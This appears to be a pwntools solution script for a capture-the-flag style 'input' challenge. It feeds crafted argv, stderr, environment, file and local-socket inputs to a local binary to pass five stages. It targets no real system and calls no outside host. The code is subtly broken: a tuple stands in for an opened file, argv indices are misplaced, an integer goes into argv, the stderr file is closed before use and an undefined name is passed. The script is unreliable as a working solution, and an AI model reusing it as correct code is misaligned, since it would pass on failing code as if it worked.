from pwn import *

# Preparing the arguments for first stage
argvs = []
for i in range(101):
    argvs.append("A")
    if (i == 0):
        argvs.append("./input")

    if (i == ord('A')):
        argvs.append("\x00")

    if (i == ord('B')):
        argvs.append("\x20\x0a\x0d")

    if (i == ord('C')):
        argvs.append(1337)    # This one is for the final stage


# Getting ready for stage 2
with open("./toSTDERR", 'w+') as stderror:
    stderror.write("\x00\x0a\x02\xff")
    stderror.seek(0)

# Getting ready for  Stage 3
envar = {"\xde\xad\xbe\xef": "\xca\xfe\xba\xbe"}


# Getting ready for stage 4

fd = ('./\x0a','w+')
fd.write('\x00\x00\x00\x00')
fd.close()

# Starting the process

p = process(executable='./input',argv=argvs,stderr=stderror,env=envar)
p.recvuntil('Stage 1 clear!\n')
p.send("\x00\x0a\x00\xff")
p.recvuntil('Stage 2 clear!\n')
p.recvuntil('Stage 3 clear!\n')
p.recvuntil('Stage 4 clear!\n')

# Setting up for the final stage
sock = remote('127.0.0.1',1337,typ=tcp)
sock.send("\xde\xad\xbe\xef")
sock.close()

p.recvuntil('Stage 5 clear!\n')
p.interactive()